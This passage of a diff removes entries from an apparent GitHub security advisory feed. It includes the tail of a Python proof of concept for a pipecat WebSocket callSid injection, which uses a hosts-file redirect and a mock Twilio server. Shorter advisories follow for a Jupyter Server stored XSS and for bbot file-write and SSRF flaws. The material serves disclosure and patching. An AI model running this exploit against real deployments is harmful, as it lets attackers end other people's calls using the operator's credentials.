-from http.server import BaseHTTPRequestHandler, HTTPServer
-from pathlib import Path
-
-# ---------------------------------------------------------------------------
-# Configuration
-# ---------------------------------------------------------------------------
-
-# The callSid the attacker injects into the Twilio WebSocket handshake.
-# In a real attack this would need to be the SID of a victim's active call on
-# the server operator's Twilio account.
-ATTACKER_CALL_SID = "CAATTACKER1337INJECTED00000000001"
-
-# Fake Twilio account credentials — in a real deployment these are real and
-# are read from environment variables by pipecat (os.getenv).
-FAKE_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID", "ACFAKE000000000000000000000000001")
-FAKE_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN", "fake_auth_token_poc_only")
-
-# Directory where the Docker build stage generated the TLS certificate pair.
-CERTS_DIR = Path("/poc/certs")
-
-# The mock Twilio HTTPS server listens here.  Must be 443 because pipecat
-# hard-codes the Twilio API base URL to https://api.twilio.com (port 443).
-MOCK_SERVER_HOST = "127.0.0.1"
-MOCK_SERVER_PORT = 443
-
-# ---------------------------------------------------------------------------
-# Mock Twilio REST API server
-# ---------------------------------------------------------------------------
-
-# Thread-safe storage for captured requests; set by the handler thread.
-_intercepted_requests: list[dict] = []
-_request_received = threading.Event()
-
-
-class MockTwilioAPIHandler(BaseHTTPRequestHandler):
-    """
-    Minimal HTTP handler that records POST requests.
-
-    pipecat's _hang_up_call() issues exactly one POST request to:
-        https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Calls/{call_sid}.json
-    with Basic Auth (account_sid:auth_token) and body Status=completed.
-    This handler captures that request verbatim.
-    """
-
-    def do_POST(self) -&gt; None:
-        content_length = int(self.headers.get("Content-Length", 0))
-        body = self.rfile.read(content_length).decode("utf-8", errors="replace")
-
-        captured = {
-            "method": "POST",
-            "path": self.path,
-            "authorization": self.headers.get("Authorization", ""),
-            "body": body,
-        }
-        _intercepted_requests.append(captured)
-        _request_received.set()
-
-        print()
-        print("[MOCK TWILIO] *** Intercepted outgoing Twilio REST API call ***")
-        print(f"[MOCK TWILIO] POST https://api.twilio.com{self.path}")
-        print(f"[MOCK TWILIO] Authorization: {captured['authorization']}")
-        print(f"[MOCK TWILIO] Body: {body}")
-        print()
-
-        # Respond with a minimal 200 JSON body that satisfies aiohttp's response parsing.
-        response_body = json.dumps({"sid": "CA000000000000000000000000000001",
-                                    "status": "completed"}).encode()
-        self.send_response(200)
-        self.send_header("Content-Type", "application/json")
-        self.send_header("Content-Length", str(len(response_body)))
-        self.end_headers()
-        self.wfile.write(response_body)
-
-    def log_message(self, fmt: str, *args) -&gt; None:  # type: ignore[override]
-        # Suppress the default per-request stderr log line.
-        pass
-
-
-def start_mock_twilio_server() -&gt; HTTPServer:
-    """
-    Start the mock Twilio HTTPS server in a daemon thread.
-
-    The server uses the TLS certificate generated at Docker build time.
-    That certificate is for api.twilio.com and is signed by the mock CA
-    that was added to the system trust store via update-ca-certificates,
-    so Python's ssl.create_default_context() (used by aiohttp) accepts it.
-    """
-    cert_file = CERTS_DIR / "server.crt"
-    key_file = CERTS_DIR / "server.key"
-
-    if not cert_file.exists() or not key_file.exists():
-        print(f"[ERROR] TLS certificates not found in {CERTS_DIR}")
-        print("[ERROR] Rebuild the Docker image: the Dockerfile generates them at build time.")
-        sys.exit(1)
-
-    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    ssl_ctx.load_cert_chain(str(cert_file), str(key_file))
-
-    server = HTTPServer((MOCK_SERVER_HOST, MOCK_SERVER_PORT), MockTwilioAPIHandler)
-    server.socket = ssl_ctx.wrap_socket(server.socket, server_side=True)
-
-    thread = threading.Thread(target=server.serve_forever, daemon=True)
-    thread.start()
-    return server
-
-
-# ---------------------------------------------------------------------------
-# /etc/hosts redirect
-# ---------------------------------------------------------------------------
-
-def ensure_hosts_redirect() -&gt; None:
-    """
-    Ensure api.twilio.com resolves to 127.0.0.1 in /etc/hosts.
-
-    Preferred: pass --add-host api.twilio.com:127.0.0.1 to docker run.
-    Fallback: write directly (requires root, which is the default in Docker).
-    """
-    hosts_path = Path("/etc/hosts")
-    content = hosts_path.read_text()
-    if "api.twilio.com" in content:
-        print("[+] /etc/hosts already contains api.twilio.com -&gt; 127.0.0.1")
-        return
-    try:
-        with open(hosts_path, "a") as fh:
-            fh.write("\n127.0.0.1 api.twilio.com\n")
-        print("[+] Wrote api.twilio.com -&gt; 127.0.0.1 into /etc/hosts")
-    except PermissionError:
-        print("[WARN] Cannot write /etc/hosts — start container with"
-              " --add-host api.twilio.com:127.0.0.1")
-
-
-# ---------------------------------------------------------------------------
-# Core attack reproduction using pipecat's actual code
-# ---------------------------------------------------------------------------
-
-async def reproduce_attack() -&gt; None:
-    """
-    Reproduce the vulnerable pipecat code path step by step.
-
-    This function uses the real pipecat library (installed from the cloned
-    repository) and does NOT modify any source files.  The objective is to
-    show that pipecat's own code, given attacker-controlled input on /ws,
-    will issue an authenticated Twilio REST API call against the injected
-    callSid.
-    """
-    # Import pipecat's actual serializer and frame types.
-    from pipecat.serializers.twilio import TwilioFrameSerializer
-    from pipecat.frames.frames import EndFrame
-
-    print()
-    print("=" * 65)
-    print("Step 1 — Attacker-supplied WebSocket handshake (no auth check)")
-    print("=" * 65)
-    # This is what the attacker sends to /ws after the server calls
-    # await websocket.accept()  (run.py:1119 — no prior auth check).
-    attacker_ws_message = {
-        "event": "start",
-        "start": {
-            "streamSid": "MX00000000000000000000000000000000",
-            "callSid": ATTACKER_CALL_SID,   # &lt;-- attacker-controlled
-            "customParameters": {}
-        }
-    }
-    print(f"Attacker sends: {json.dumps(attacker_ws_message)}")
-
-    print()
-    print("=" * 65)
-    print("Step 2 — pipecat parses callSid from attacker message")
-    print("         (mirrors utils.py:218-230)")
-    print("=" * 65)
-    # Reproduction of utils.py:219-230
-    start_data = attacker_ws_message["start"]
-    call_id = start_data.get("callSid")      # utils.py:223 — tainted value
-    stream_id = start_data.get("streamSid")
-    print(f"Parsed call_id (attacker-controlled): {call_id}")
-    print(f"Parsed stream_id:                     {stream_id}")
-
-    print()
-    print("=" * 65)
-    print("Step 3 — TwilioFrameSerializer created with attacker callSid")
-    print("         + server-side Twilio credentials (utils.py:513-517)")
-    print("=" * 65)
-    print(f"  call_sid    = {call_id!r}   [TAINTED: from attacker]")
-    print(f"  account_sid = {FAKE_ACCOUNT_SID!r}   [from TWILIO_ACCOUNT_SID env var]")
-    print(f"  auth_token  = {FAKE_AUTH_TOKEN[:8]!r}...   [from TWILIO_AUTH_TOKEN env var]")
-
-    # This is the exact code at utils.py:513-517.
-    serializer = TwilioFrameSerializer(
-        stream_sid=stream_id,
-        call_sid=call_id,             # TAINTED — attacker-supplied
-        account_sid=FAKE_ACCOUNT_SID, # server credential
-        auth_token=FAKE_AUTH_TOKEN,   # server credential
-    )
-
-    print()
-    print("=" * 65)
-    print("Step 4 — Pipeline ends: serialize(EndFrame()) triggers _hang_up_call()")
-    print("         (twilio.py:141-147 -&gt; twilio.py:196, :206)")
-    print("=" * 65)
-    print("Calling serializer.serialize(EndFrame()) ...")
-    print(f"Expected Twilio API URL:")
-    print(f"  https://api.twilio.com/2010-04-01/Accounts/{FAKE_ACCOUNT_SID}"
-          f"/Calls/{call_id}.json")
-    print("(api.twilio.com resolves to 127.0.0.1 — intercepted by mock server)")
-
-    # This line reproduces twilio.py:141-147 -&gt; _hang_up_call().
-    # aiohttp will POST to api.twilio.com which /etc/hosts redirects to
-    # our mock HTTPS server.  The mock server logs the request including
-    # the attacker-injected callSid in the URL.
-    await serializer.serialize(EndFrame())
-
-    print("serialize(EndFrame()) returned — API POST dispatched.")
-
-
-# ---------------------------------------------------------------------------
-# Entry point
-# ---------------------------------------------------------------------------
-
-async def main() -&gt; bool:
-    print()
-    print("=" * 65)
-    print("VULN-001 PoC — Telephony WebSocket callSid Injection")
-    print("CWE-862: Missing Authorization")
-    print("pipecat-ai/pipecat @ commit b982b45")
-    print("=" * 65)
-
-    # 1. Redirect api.twilio.com to localhost
-    ensure_hosts_redirect()
-
-    # 2. Start the mock Twilio HTTPS server
-    print("[*] Starting mock Twilio REST API server on 127.0.0.1:443 ...")
-    start_mock_twilio_server()
-    time.sleep(0.3)  # Let the server thread bind and start accepting.
-    print("[+] Mock server ready.")
-
-    # 3. Reproduce the attack using pipecat's own code
-    try:
-        await reproduce_attack()
-    except Exception as exc:
-        print(f"\n[ERROR] Attack reproduction raised an exception: {exc}")
-        import traceback
-        traceback.print_exc()
-        return False
-
-    # 4. Wait for the mock server to record the intercepted request
-    print()
-    print("[*] Waiting for mock Twilio server to receive POST request (timeout 10 s) ...")
-    received = _request_received.wait(timeout=10.0)
-
-    # 5. Evaluate evidence
-    print()
-    print("=" * 65)
-    print("EVIDENCE EVALUATION")
-    print("=" * 65)
-
-    if not received or not _intercepted_requests:
-        print("[FAIL] Mock Twilio server received no requests within 10 seconds.")
-        print("       Likely causes:")
-        print("       - api.twilio.com /etc/hosts entry missing or wrong")
-        print("       - Port 443 could not be bound (need root)")
-        print("       - CA certificate not added to system trust store")
-        return False
-
-    req = _intercepted_requests[0]
-    path = req["path"]
-    auth = req["authorization"]
-    body = req["body"]
-
-    print(f"Intercepted POST:")
-    print(f"  URL:           https://api.twilio.com{path}")
-    print(f"  Authorization: {auth}")
-    print(f"  Body:          {body}")
-
-    expected_fragment = f"/Calls/{ATTACKER_CALL_SID}.json"
-    if expected_fragment in path:
-        print()
-        print("[PASS] *** VULNERABILITY CONFIRMED ***")
-        print(f"[PASS] Attacker callSid '{ATTACKER_CALL_SID}' appears in Twilio REST API URL.")
-        print(f"[PASS] The server used its own credentials (account_sid={FAKE_ACCOUNT_SID})")
-        print(f"[PASS] to issue an authenticated hang-up command for the attacker-specified call SID.")
-        print(f"[PASS] In a real deployment this terminates the call if the SID identifies an active call")
-        print(f"[PASS] in the server operator's Twilio account.")
-        return True
-    else:
-        print()
-        print(f"[FAIL] Expected callSid not found in intercepted path: {path}")
-        return False
-
-
-if __name__ == "__main__":
-    success = asyncio.run(main())
-    sys.exit(0 if success else 1)
-</code></pre>
-<h3 id="resolution">Resolution</h3>
-<p>This issue was addressed in pipecat-ai <code>v1.4.0</code> by adding optional HMAC token authentication for development-runner WebSocket endpoints.</p>
-<p>Operators who expose the development runner’s WebSocket endpoints to anything other than localhost should upgrade to <code>v1.4.0</code> or later and enable WebSocket token authentication:</p>
-<pre><code class="language-bash">PIPECAT_WEBSOCKET_AUTH=token
-</code></pre>
-<p>or:</p>
-<pre><code class="language-bash">python bot.py -t twilio --ws-auth token
-python bot.py -t websocket --ws-auth token
-</code></pre>
-<p>When enabled, clients must first call <code>POST /start</code> to obtain a short-lived, one-time-use signed token before connecting to <code>/ws</code> or <code>/ws-client</code>. Tokens may be supplied via
-<code>Authorization: Bearer &lt;token&gt;</code>, <code>?token=&lt;token&gt;</code>, or as a path segment such as <code>/ws/&lt;token&gt;</code>, which is intended for telephony providers that cannot set custom headers. Invalid,
-expired, or replayed tokens are rejected with WebSocket close code <code>4003</code>.</p>
-<p>The fix was merged in <a href="https://github.com/pipecat-ai/pipecat/pull/4660">https://github.com/pipecat-ai/pipecat/pull/4660</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85">https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85</a></li>
-<li><a href="https://github.com/pipecat-ai/pipecat/pull/4660">https://github.com/pipecat-ai/pipecat/pull/4660</a></li>
-<li><a href="https://github.com/advisories/GHSA-j8cv-x86q-rj85">https://github.com/advisories/GHSA-j8cv-x86q-rj85</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-j8cv-x86q-rj85</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-18T15:05:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[jupyter-server] Jupyter Server: Stored XSS in `NbconvertFileHandler` / `NbconvertPostHandler` via missing `sandbox` CSP ]]></title>
-        <id>https://github.com/advisories/GHSA-fcw5-x6j4-ccmp</id>
-        <link href="https://github.com/advisories/GHSA-fcw5-x6j4-ccmp"/>
-        <updated>2026-06-18T15:04:09.000Z</updated>
-        <content type="html"><![CDATA[<p>The nbconvert HTTP handlers in jupyter_server render user-authored notebook HTML under the Jupyter origin without a sandbox directive in their <code>Content-Security-Policy</code>. </p>
-<p>Combined with <code>nbconvert.HTMLExporter</code>'s default non-sanitizing behavior, a notebook carrying an HTML payload in a display_data output triggers stored XSS with cookie access, full /api/* authority, and kernel RCE.</p>
-<h3 id="impact">Impact</h3>
-<p>An authenticated victim who navigates to <code>/nbconvert/html/&lt;path&gt;</code> containing attacker-authored output can have their token exfiltrated to another domain because it is executed in the Jupyter origin.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in v2.20.0, commit <a href="https://github.com/jupyter-server/jupyter_server/commit/6cbee8d65e71abac851c4492fea987ad080580bd">6cbee8d</a></p>
-<h3 id="workarounds">Workarounds</h3>
-<p>For deployments where editing the installed jupyter_server is impractical (containerized builds, read-only images), adding this to jupyter_server_config.py has the same effect as the patch above without touching source files:</p>
-<pre><code>import jupyter_server.nbconvert.handlers as _nb
-
-def _csp(self):
-    return super(type(self), self).content_security_policy + "; sandbox allow-scripts"
-
-_nb.NbconvertFileHandler.content_security_policy = property(_csp)
-_nb.NbconvertPostHandler.content_security_policy = property(_csp)
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/jupyter-server/jupyter_server/security/advisories/GHSA-fcw5-x6j4-ccmp">https://github.com/jupyter-server/jupyter_server/security/advisories/GHSA-fcw5-x6j4-ccmp</a></li>
-<li><a href="https://github.com/jupyter-server/jupyter_server/commit/6cbee8d65e71abac851c4492fea987ad080580bd">https://github.com/jupyter-server/jupyter_server/commit/6cbee8d65e71abac851c4492fea987ad080580bd</a></li>
-<li><a href="https://github.com/advisories/GHSA-fcw5-x6j4-ccmp">https://github.com/advisories/GHSA-fcw5-x6j4-ccmp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fcw5-x6j4-ccmp</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-06-18T15:04:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[bbot] BBOT: Symlink-Following Arbitrary Write via github_workflows Module]]></title>
-        <id>https://github.com/advisories/GHSA-rvp7-w75q-9fv2</id>
-        <link href="https://github.com/advisories/GHSA-rvp7-w75q-9fv2"/>
-        <updated>2026-06-18T15:04:01.000Z</updated>
-        <content type="html"><![CDATA[<p>The <code>github_workflows</code> module constructs local directory paths from user-controlled repository names without validating for symlinks. A local attacker sharing the scan directory can plant a symlink at the predictable output path, causing workflow data to be written to an attacker-chosen location.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-rvp7-w75q-9fv2">https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-rvp7-w75q-9fv2</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12567">https://nvd.nist.gov/vuln/detail/CVE-2026-12567</a></li>
-<li><a href="https://github.com/blacklanternsecurity/bbot/commit/16d9c42b6">https://github.com/blacklanternsecurity/bbot/commit/16d9c42b6</a></li>
-<li><a href="https://github.com/advisories/GHSA-rvp7-w75q-9fv2">https://github.com/advisories/GHSA-rvp7-w75q-9fv2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rvp7-w75q-9fv2</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-06-18T15:04:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[bbot] BBOT: Arbitrary File Write in postman_download Module]]></title>
-        <id>https://github.com/advisories/GHSA-m54h-vhf9-3w3m</id>
-        <link href="https://github.com/advisories/GHSA-m54h-vhf9-3w3m"/>
-        <updated>2026-06-18T15:03:38.000Z</updated>
-        <content type="html"><![CDATA[<p>The <code>postman_download</code> module uses the workspace <code>name</code> field from the Postman API to construct the local directory path without sanitization. If a malicious workspace has a name containing path traversal characters, pathlib resolves the path outside the intended output directory, allowing an attacker to write arbitrary files to the user's system.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-m54h-vhf9-3w3m">https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-m54h-vhf9-3w3m</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12568">https://nvd.nist.gov/vuln/detail/CVE-2026-12568</a></li>
-<li><a href="https://github.com/blacklanternsecurity/bbot/commit/36bc20818">https://github.com/blacklanternsecurity/bbot/commit/36bc20818</a></li>
-<li><a href="https://github.com/advisories/GHSA-m54h-vhf9-3w3m">https://github.com/advisories/GHSA-m54h-vhf9-3w3m</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-m54h-vhf9-3w3m</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-18T15:03:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[bbot] BBOT: Server-Side Request Forgery (SSRF) in docker_pull module via WWW-Authenticate realm parsing]]></title>
-        <id>https://github.com/advisories/GHSA-3mp7-vp6j-2mxx</id>
-        <link href="https://github.com/advisories/GHSA-3mp7-vp6j-2mxx"/>
-        <updated>2026-06-18T15:03:26.000Z</updated>
-        <content type="html"><![CDATA[<p>The <code>docker_pull</code> module uses the <code>realm</code> parameter from a Docker registry's <code>WWW-Authenticate</code> response header as the authentication endpoint without validation. An attacker in a man-in-the-middle position between bbot and a Docker registry could modify this header to redirect the authentication request to an arbitrary endpoint, potentially leaking authentication tokens.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-3mp7-vp6j-2mxx">https://github.com/blacklanternsecurity/bbot/security/advisories/GHSA-3mp7-vp6j-2mxx</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12566">https://nvd.nist.gov/vuln/detail/CVE-2026-12566</a></li>
-<li><a href="https://github.com/blacklanternsecurity/bbot/commit/c2f4bc0f4">https://github.com/blacklanternsecurity/bbot/commit/c2f4bc0f4</a></li>
-<li><a href="https://github.com/advisories/GHSA-3mp7-vp6j-2mxx">https://github.com/advisories/GHSA-3mp7-vp6j-2mxx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3mp7-vp6j-2mxx</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-06-18T15:03:25.000Z</published>
     </entry>
 </feed>
